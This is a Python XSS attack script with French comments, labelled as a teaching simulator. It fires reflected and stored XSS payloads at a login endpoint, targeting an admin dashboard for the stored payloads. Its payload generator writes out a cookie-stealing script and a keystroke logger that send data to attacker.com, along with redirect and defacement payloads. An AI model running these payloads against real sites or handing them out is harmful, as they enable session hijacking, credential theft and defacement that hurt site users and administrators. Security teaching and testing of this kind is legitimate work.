#!/usr/bin/env python3
"""
Attaque XSS améliorée
Avec support Ngrok et analyse détaillée
"""

import requests
from colorama import Fore, Style, init
from config import get_target_url, load_config

init(autoreset=True)

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<iframe src='javascript:alert(1)'>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "javascript:alert('XSS')",
    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
]


def banner():
    print(f"""
{Fore.YELLOW}╔═══════════════════════════════════════════════════╗
║         🕷️  XSS ATTACK SIMULATOR v2.0            ║
║              POUR TESTS PÉDAGOGIQUES              ║
╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}
""")


class XSSAnalyzer:
    """Analyse les résultats XSS"""
    
    def __init__(self):
        self.total_tests = 0
        self.reflected_xss = []
        self.stored_attempts = []
        self.safe_payloads = []
    
    def add_reflected_test(self, payload, reflected):
        """Ajoute un test XSS reflété"""
        self.total_tests += 1
        if reflected:
            self.reflected_xss.append(payload)
        else:
            self.safe_payloads.append(payload)
    
    def add_stored_test(self, payload):
        """Ajoute une tentative XSS stocké"""
        self.stored_attempts.append(payload)
    
    def print_summary(self):
        """Affiche le résumé"""
        print(f"\n{Fore.CYAN}╔═══════════════ RAPPORT XSS ═══════════════╗{Style.RESET_ALL}")
        
        print(f"\n{Fore.WHITE}📊 TESTS REFLÉTÉS:{Style.RESET_ALL}")
        print(f"  • Payloads testés: {self.total_tests}")
        print(f"  • XSS détectés: {Fore.RED}{len(self.reflected_xss)}{Style.RESET_ALL}")
        print(f"  • Filtrés: {Fore.GREEN}{len(self.safe_payloads)}{Style.RESET_ALL}")
        
        if self.reflected_xss:
            print(f"\n{Fore.RED}⚠️  VULNÉRABILITÉS XSS REFLÉTÉES:{Style.RESET_ALL}")
            for i, payload in enumerate(self.reflected_xss[:5], 1):
                print(f"  {i}. {payload[:60]}...")
        
        if self.stored_attempts:
            print(f"\n{Fore.YELLOW}💾 XSS STOCKÉS (tentatives):{Style.RESET_ALL}")
            print(f"  • Payloads envoyés: {len(self.stored_attempts)}")
            print(f"  • Vérifiez le dashboard pour confirmer l'exécution")
        
        # Analyse de sécurité
        print(f"\n{Fore.CYAN}🔐 ANALYSE DE SÉCURITÉ:{Style.RESET_ALL}")
        
        if len(self.reflected_xss) > 0:
            print(f"  {Fore.RED}⚠️  VULNÉRABLE À XSS REFLÉTÉ{Style.RESET_ALL}")
            print(f"  {Fore.RED}   → {len(self.reflected_xss)} payload(s) fonctionnel(s){Style.RESET_ALL}")
            print(f"\n  {Fore.YELLOW}Recommandations:{Style.RESET_ALL}")
            print(f"    • Encoder toutes les sorties HTML")
            print(f"    • Utiliser textContent au lieu de innerHTML")
            print(f"    • Implémenter Content Security Policy (CSP)")
            print(f"    • Sanitiser tous les inputs utilisateur")
        else:
            print(f"  {Fore.GREEN}✓ XSS REFLÉTÉ FILTRÉ{Style.RESET_ALL}")


def test_reflected_xss(url):
    """Teste XSS reflété"""
    print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════╗")
    print(f"║          🔍 TEST XSS REFLÉTÉ                     ║")
    print(f"╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
    
    analyzer = XSSAnalyzer()
    
    for i, payload in enumerate(XSS_PAYLOADS, 1):
        print(f"{Fore.CYAN}[{i}/{len(XSS_PAYLOADS)}] Test: {payload[:50]}...{Style.RESET_ALL}")
        
        try:
            response = requests.post(
                url,
                json={"username": payload, "password": "test"},
                timeout=10
            )
            
            # Vérifier si le payload est reflété
            if payload in response.text:
                print(f"{Fore.RED}    [!] VULNÉRABLE - Payload reflété !{Style.RESET_ALL}")
                analyzer.add_reflected_test(payload, True)
            else:
                print(f"{Fore.GREEN}    [✓] Filtré{Style.RESET_ALL}")
                analyzer.add_reflected_test(payload, False)
        
        except Exception as e:
            print(f"{Fore.YELLOW}    [!] Erreur: {str(e)}{Style.RESET_ALL}")
    
    analyzer.print_summary()
    return analyzer


def test_stored_xss(url):
    """Teste XSS stocké"""
    print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════╗")
    print(f"║          💾 TEST XSS STOCKÉ                      ║")
    print(f"╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
    
    print(f"{Fore.WHITE}Principe:{Style.RESET_ALL}")
    print("  Injecter des payloads XSS qui seront stockés dans MongoDB")
    print("  et exécutés quand un admin consulte le dashboard\n")
    
    analyzer = XSSAnalyzer()
    
    dangerous_payloads = [
        "<script>alert('XSS Stocké !')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert(document.cookie)>"
    ]
    
    for i, payload in enumerate(dangerous_payloads, 1):
        print(f"{Fore.CYAN}[{i}/{len(dangerous_payloads)}] Injection: {payload}{Style.RESET_ALL}")
        
        try:
            response = requests.post(
                url,
                json={"username": payload, "password": "xss_test"},
                timeout=10
            )
            
            print(f"{Fore.GREEN}    [✓] Payload envoyé au serveur{Style.RESET_ALL}")
            analyzer.add_stored_test(payload)
            
        except Exception as e:
            print(f"{Fore.RED}    [✗] Erreur: {str(e)}{Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}[!] Pour vérifier:{Style.RESET_ALL}")
    print("  1. Connectez-vous au dashboard en tant qu'administrateur")
    print("  2. Consultez la table 'users'")
    print("  3. Si une alerte JavaScript s'affiche = XSS stocké réussi !")
    
    analyzer.print_summary()
    return analyzer


def generate_xss_payload():
    """Générateur de payloads XSS"""
    print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════╗")
    print(f"║        🛠️  GÉNÉRATEUR DE PAYLOADS XSS            ║")
    print(f"╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
    
    print(f"{Fore.WHITE}Type de payload:")
    print("1. Alert simple")
    print("2. Vol de cookies")
    print("3. Redirection")
    print("4. Keylogger")
    print("5. Défacement{Style.RESET_ALL}\n")
    
    choice = input(f"{Fore.CYAN}Choix (1-5): {Style.RESET_ALL}")
    
    payloads = {
        "1": "<script>alert('XSS Test')</script>",
        "2": "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>",
        "3": "<script>window.location='https://malicious-site.com'</script>",
        "4": "<script>document.onkeypress=e=>fetch('https://attacker.com/log?k='+e.key)</script>",
        "5": "<script>document.body.innerHTML='<h1>HACKED</h1>'</script>"
    }
    
    if choice in payloads:
        print(f"\n{Fore.GREEN}[✓] Payload généré:{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}{payloads[choice]}{Style.RESET_ALL}\n")
        
        print(f"{Fore.WHITE}Variantes:{Style.RESET_ALL}")
        print(f"  IMG: <img src=x onerror=\"{payloads[choice][8:-9]}\">")
        print(f"  SVG: <svg/onload=\"{payloads[choice][8:-9]}\">")
    else:
        print(f"{Fore.RED}[✗] Choix invalide{Style.RESET_ALL}")


def main():
    banner()
    
    # Charger ou demander la configuration
    config = load_config()
    if not config:
        print(f"{Fore.YELLOW}[!] Aucune configuration trouvée{Style.RESET_ALL}")
        config = get_target_url()
    
    TARGET_URL = config['login_endpoint']
    
    print(f"\n{Fore.GREEN}[✓] Cible configurée: {TARGET_URL}{Style.RESET_ALL}")
    
    print(f"""
{Fore.WHITE}Sélectionnez le type de test XSS:
1. XSS Reflété
2. XSS Stocké
3. Générateur de payloads
4. Tous les tests
5. Quitter{Style.RESET_ALL}
""")
    
    choice = input(f"{Fore.CYAN}Votre choix (1-5): {Style.RESET_ALL}")
    
    if choice == "1":
        test_reflected_xss(TARGET_URL)
    elif choice == "2":
        test_stored_xss(TARGET_URL)
    elif choice == "3":
        generate_xss_payload()
    elif choice == "4":
        test_reflected_xss(TARGET_URL)
        test_stored_xss(TARGET_URL)
    elif choice == "5":
        print(f"{Fore.CYAN}[*] Au revoir !{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[✗] Choix invalide{Style.RESET_ALL}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Test interrompu{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[✗] Erreur: {str(e)}{Style.RESET_ALL}")